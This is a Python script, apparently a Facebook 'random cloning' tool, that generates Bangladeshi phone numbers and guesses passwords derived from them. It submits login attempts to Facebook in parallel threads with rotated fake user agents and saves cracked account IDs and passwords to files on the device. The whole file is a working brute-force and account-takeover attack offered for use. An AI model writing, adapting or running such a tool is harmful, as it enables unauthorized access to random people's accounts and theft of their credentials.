import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass

ok=[]
cp=[]
id=[]
session=requests.Session()
user=[]
loop=0
oks=[]
cps=[]
loop=0
ugen=[]
for mn in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	momin=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(momin)


#......color......#
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'



def logo():
  os.system('clear')
  print(f"""\033[96;1m   
 ███    ███  ██████  ███    ███ ██ ███    ██
 ████  ████ ██    ██ ████  ████ ██ ████   ██ 
 ██ ████ ██ ██    ██ ██ ████ ██ ██ ██ ██  ██
 ██  ██  ██ ██    ██ ██  ██  ██ ██ ██  ██ ██ 
 ██      ██  ██████  ██      ██ ██ ██   ████
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m AUTHOR    : MOMIN ISLAM  
\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m GITHUB    : CYBER-MOMIN69  
\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TYPE TYPE : FREE 
\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m VERSION   : 0.0.1
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;92m""")                     

def Main():
  logo()
  print('\n [1] RANDOM CLONING')
  print(' [0] EXIT')
  print(f'\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;92m')
  chose=input(" CHOOSE : ")
  if chose in ["1","01"]:
    main()
  if chose in ["0","00"]:
    exit()
    

    


def main():
  logo()
  love=input(f'{WHITE}[{GREEN}+{WHITE}] BD CODE   :   {GREEN}017,018,019\n{WHITE}[{GREEN}+{WHITE}] SIM CODE  :  ')
  os.system("clear")
  logo()
  limit=int(input(f'{WHITE}[{GREEN}+{WHITE}] CRACK LIMIT : {GREEN}10000,20000,30000\n{WHITE}[{GREEN}+{WHITE}] CRACK ID   :  '))
  for nmbr in range(limit):
    lova=''.join(random.choice(string.digits) for _ in range(2))
    lovb=''.join(random.choice(string.digits) for _ in range(2))
    nmp=''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30)as soniya:
    all=str(len(user))
    logo()
    print(f'\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;92m')
    print(f'\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;97m'+love)
    print(f'\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+all)
    print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m IF NO RESULTS TURN ON/OFF AIRPLANE MODE')
    print('\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;92m')
    for guru in user:
      uid=love+lova+lovb+guru
      pwx = [lova+lovb+guru,love+lova+lovb,love+love]
      soniya.submit(test,uid,pwx,all)
  print('\nCRACK PROCESS HAS BEEN COMPLETED')
  print('\nIDS SAVED IN MOMIN-OK.txt ')
  print('\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;92m')
  exit()

def test(uid,pwx,all):
    global loop
    global cps    
    global oks
    global agents
    try:
    	for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m [\033[1;92mROX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,all,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'developer.facebook.com',
    'method': 'GET',
    'path': '/',
    'scheme': 'https',
    'access-control-allow-origin': '*',
    'facebook-api-version': 'v17.0',
    'strict-transport-security': 'max-age=15552000; preload',
    'pragma': 'no-cache',
    'cache-control': 'private, no-cache, no-store, must-revalidate',
    'x-fb-request-id': 'Aq8PVbxLqOALjWTPw-avtJd',
    'x-fb-trace-id': 'Hm7POAaNeQ3',
    'x-fb-rev': '1007716891',
    'x-fb-debug': 'LrGqyvNhSagvW1DkBvEtn8ji7l4GcJlzTeOC9VbGFmmjg82MN1zIXtyTs0XP5umknqtdv5HQg3p1YbT665M/dg==',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\r\033[1;32m [ROX-OK] {cid} | {ps}  ')
                oks.append(cid)
                open('/sdcard/ROX-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\033[96;1m [ROX-CP] {cid} | {ps}")
                open('/sdcard/ROX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
                loop+=1        
    except:
        pass
Main()